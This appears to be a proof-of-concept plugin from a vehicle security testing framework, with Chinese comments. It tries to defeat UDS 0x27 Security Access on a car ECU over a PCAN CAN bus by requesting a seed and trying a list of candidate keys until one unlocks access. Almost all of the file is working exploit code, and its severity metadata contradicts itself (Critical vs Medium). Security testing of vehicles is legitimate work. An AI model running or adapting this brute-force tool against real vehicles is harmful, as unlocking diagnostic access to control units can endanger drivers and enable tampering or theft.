"""
PoC Name: UDS Security Access Brute Force
CVE: N/A
Component: Canbus Stack
Category: Canbus
Severity: Critical
CVSS: 8.5
Description: UDS 0x27安全访问Seed-Key暴力破解 (PCAN)
Prerequisites: PCAN接口(如PCAN_USBBUS1), python-can库, PCAN驱动。
Usage: python3 27_UDS_Security_Access_Brute.py PCAN_USBBUS1
"""
import sys
from iv_plugin_base import IVIVulnerabilityPlugin
from can_bus_utils import format_can_settings, get_can_settings, open_can_bus

class UDSSecurityAccessBrutePlugin(IVIVulnerabilityPlugin):
    meta_poc_name = "UDS Security Access Brute"
    meta_cve_id = "N/A"
    meta_severity = "Medium"
    meta_protocol = "can"
    meta_target_os = ["all"]
    meta_required_params = ["can_interface"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        settings = get_can_settings(self.params)
        self.logger.info(f"使用CAN接口: {format_can_settings(settings)}")
        return True

    def exploit(self):
        settings = get_can_settings(self.params)
        self.logger.info(f"开始UDS 0x27安全访问暴力破解 ({format_can_settings(settings)})...")
        bus = None
        try:
            import can
            bus = open_can_bus(self.params)

            # 尝试获取种子 (SID 0x27, Sub 0x01)
            msg = can.Message(
                arbitration_id=0x7E0,
                data=[0x02, 0x27, 0x01, 0, 0, 0, 0, 0],
                is_extended_id=False,
            )
            bus.send(msg)
            resp = bus.recv(timeout=1.0)

            if resp and len(resp.data) > 3 and resp.data[1] == 0x67 and resp.data[2] == 0x01:
                 seed = bytes(resp.data[3:7])
                 self.logger.info(f"[+] 成功获取种子: {seed.hex().upper()}")

                 key_candidates = self._load_key_candidates()
                 if not key_candidates:
                     self.logger.warning("未提供任何 key 候选值；仅拿到 seed 不能证明存在暴力破解/认证绕过漏洞。")
                     self.results["vulnerable"] = False
                     self.results["evidence"] = (
                         f"Security Access seed obtained: {seed.hex()}; "
                         "no key candidates supplied, exploit remains unverified."
                     )
                     return self.results

                 self.logger.info(f"开始尝试 {len(key_candidates)} 个候选 key...")
                 for key_guess in key_candidates:
                     key_bytes = key_guess.to_bytes(4, byteorder="big", signed=False)
                     req = can.Message(
                         arbitration_id=0x7E0,
                         data=[0x06, 0x27, 0x02, *key_bytes],
                         is_extended_id=False,
                     )
                     self.logger.info(f"  尝试 Key: {key_guess:08X}")
                     bus.send(req)
                     key_resp = bus.recv(timeout=1.0)
                     if not key_resp:
                         continue
                     if len(key_resp.data) >= 3 and key_resp.data[1] == 0x67 and key_resp.data[2] == 0x02:
                         self.results["vulnerable"] = True
                         self.results["evidence"] = (
                             f"Security Access unlocked with key 0x{key_guess:08X} "
                             f"for seed {seed.hex()}"
                         )
                         return self.results
                     if len(key_resp.data) >= 4 and key_resp.data[1] == 0x7F:
                         self.logger.info(
                             f"  ECU negative response NRC=0x{key_resp.data[3]:02X} for key 0x{key_guess:08X}"
                         )

                 self.results["vulnerable"] = False
                 self.results["evidence"] = (
                     f"Seed {seed.hex()} obtained, but none of {len(key_candidates)} tested keys unlocked access."
                 )
            else:
                 self.logger.info("未收到正响应或不需要认证")
                 self.results["vulnerable"] = False
        except ImportError:
            self.logger.error("python-can未安装")
            self.results["vulnerable"] = False
            self.results["evidence"] = "python-can not installed"
        except Exception as e:
            self.logger.info(f"UDS测试失败: {e}")
            self.results["vulnerable"] = False
            self.results["evidence"] = f"UDS test failed: {e}"
        finally:
            if bus is not None:
                bus.shutdown()
        return self.results

    def _load_key_candidates(self):
        raw = self.params.get("key_candidates")
        if raw is None:
            return []
        if isinstance(raw, (list, tuple)):
            candidates = raw
        else:
            candidates = str(raw).split(",")

        parsed = []
        for item in candidates:
            token = str(item).strip().lower()
            if not token:
                continue
            if token.startswith("0x"):
                token = token[2:]
            try:
                parsed.append(int(token, 16))
            except ValueError:
                self.logger.warning(f"忽略非法 key 候选值: {item}")
        return parsed

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 27_UDS_Security_Access_Brute.py <can_interface> [hex_key1,hex_key2,...]")
        sys.exit(1)
    params = {"can_interface": sys.argv[1]}
    if len(sys.argv) >= 3:
        params["key_candidates"] = sys.argv[2]
    plugin = UDSSecurityAccessBrutePlugin(params)
    plugin.run_verify()
